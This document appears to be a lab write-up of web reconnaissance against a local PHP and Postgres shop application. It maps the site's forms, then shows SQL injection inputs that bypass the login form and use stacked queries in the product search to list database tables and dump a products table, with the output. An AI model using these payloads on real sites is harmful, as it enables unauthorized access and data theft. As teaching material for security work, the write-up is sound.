Web Application Reconnaissance
=========================================

Part 1
--------------------

A quick look at the devtools from the browser when making a request to `localhost:8080` quickly shows a Request Cookie
with the name `PHPSESSID` so we are likely looking at a php application.  I was not able to glean many more details about
the framework, but I am pretty sure it is not wordpress or drupal or joomla.

Part 2
--------------------

When looking at the different pages, here are some of the requests that exist on the site with their methods and any inputs
that are part of the defined actions.

| Source Page | Destination | Method | Inputs |
| ----------- | ----------- | ------ | ------ |
| `/` or `/index.php` | `/products/search.php` | **GET** | product, submit(`Search!`) |
|                     | `/loginform.php` | **GET** | |
|                     | `/signup.php` | **GET** | |
|                     | `/secret.php` | **GET** | id, submit(`secret!`) |
|                     | `contact.php` | **GET** | |
|                     | `/logout.php` | **GET** | |
| `/loginform.php`    | `login.php` | **POST** | username, password, submit(`Login`) |
| `/signup.php`       |             |          | |
| `/contact.php`      | `/docontact.php` | **POST** | email, description, submit(`Contact us!`) |


### Url Analysis

Obviously the `/products/search.php` seems like a good one to start with and when running the search you can see that the
value supplied in the input field is passed in the query parameter `?products=<query>`.  Another good one to look at is
the `/login.php`.  Lets first see what happens if we attack the login form.

#### Login.php

When I passed in the username of `' OR 1` the login returned an error from the `pg_query` that was run:
> Warning: pg_query(): Query failed: ERROR: syntax error at or near "' AND password = '" LINE 1: ...ELECT count(*) FROM users WHERE username = '' OR 1' AND pass... ^ in /var/projects/ecommerce/login.php on line 12
> An error occurred. Unable to authenticate you Back home

This is great, we now have a way into the system because we know that we can use.  In face by looking at the query we want to adjust
the input we are providing to make the query look more like `... FROM users WHERE username = '' OR TRUE; --AND pass...`.  So changing
the username to `' OR TRUE;--` and the password to just blah results in the output of **Welcome!**

Returning to the home page we now have a `/logout.php` link that is available.

#### products/search.php

For this next section, lets see what we can return.  Since I am not familar with the schema of the database, lets try
to get the list of tables.  Since the database is now known to be a postgres database (from the error above) lets use
the query to get the list of tables:

    SELECT * FROM pg_catalog.pg_tables

To provide that in the product search we are going to send `'; SELECT * FROM pg_catalog.pg_tables; --`.

This worked out great, providing us with the list of all tables as shown here:

```
Product list:
Product: public Description: products
Product: pg_catalog Description: pg_statistic
Product: pg_catalog Description: pg_type
Product: pg_catalog Description: pg_foreign_server
Product: pg_catalog Description: pg_authid
Product: pg_catalog Description: pg_statistic_ext_data
Product: pg_catalog Description: pg_user_mapping
Product: pg_catalog Description: pg_subscription
Product: pg_catalog Description: pg_attribute
Product: pg_catalog Description: pg_proc
Product: pg_catalog Description: pg_class
Product: pg_catalog Description: pg_attrdef
Product: pg_catalog Description: pg_constraint
Product: pg_catalog Description: pg_inherits
Product: pg_catalog Description: pg_index
Product: pg_catalog Description: pg_operator
Product: pg_catalog Description: pg_opfamily
Product: pg_catalog Description: pg_opclass
Product: pg_catalog Description: pg_am
Product: pg_catalog Description: pg_amop
Product: pg_catalog Description: pg_amproc
Product: pg_catalog Description: pg_language
Product: pg_catalog Description: pg_largeobject_metadata
Product: pg_catalog Description: pg_aggregate
Product: pg_catalog Description: pg_largeobject
Product: pg_catalog Description: pg_statistic_ext
Product: pg_catalog Description: pg_rewrite
Product: pg_catalog Description: pg_trigger
Product: pg_catalog Description: pg_event_trigger
Product: pg_catalog Description: pg_description
Product: pg_catalog Description: pg_cast
Product: pg_catalog Description: pg_enum
Product: pg_catalog Description: pg_namespace
Product: pg_catalog Description: pg_conversion
Product: pg_catalog Description: pg_depend
Product: pg_catalog Description: pg_database
Product: pg_catalog Description: pg_db_role_setting
Product: pg_catalog Description: pg_tablespace
Product: pg_catalog Description: pg_pltemplate
Product: pg_catalog Description: pg_auth_members
Product: pg_catalog Description: pg_shdepend
Product: pg_catalog Description: pg_shdescription
Product: pg_catalog Description: pg_ts_config
Product: pg_catalog Description: pg_ts_config_map
Product: pg_catalog Description: pg_ts_dict
Product: pg_catalog Description: pg_ts_parser
Product: pg_catalog Description: pg_ts_template
Product: pg_catalog Description: pg_extension
Product: pg_catalog Description: pg_foreign_data_wrapper
Product: pg_catalog Description: pg_foreign_table
Product: pg_catalog Description: pg_policy
Product: pg_catalog Description: pg_replication_origin
Product: pg_catalog Description: pg_default_acl
Product: pg_catalog Description: pg_init_privs
Product: pg_catalog Description: pg_seclabel
Product: pg_catalog Description: pg_shseclabel
Product: pg_catalog Description: pg_collation
Product: pg_catalog Description: pg_partitioned_table
Product: pg_catalog Description: pg_range
Product: pg_catalog Description: pg_transform
Product: pg_catalog Description: pg_sequence
Product: pg_catalog Description: pg_publication
Product: pg_catalog Description: pg_publication_rel
Product: pg_catalog Description: pg_subscription_rel
Product: information_schema Description: sql_packages
Product: information_schema Description: sql_features
Product: information_schema Description: sql_implementation_info
Product: information_schema Description: sql_parts
Product: information_schema Description: sql_lang
```

Now that we know there is a `public:products` table lets query it for its values.  By sending in the search input of `'; SELECT * FROM products; --`
we are able to receive the following output:

```
Product list:
Product: 1 Description: phone
Product: 2 Description: phoneXL
```

Final Comments
--------------------------------

This site is easily accessible using sql injection to both "fake" a logged in user (although we aren't really giving a user id which may be required)
as well as query for any information in any table.
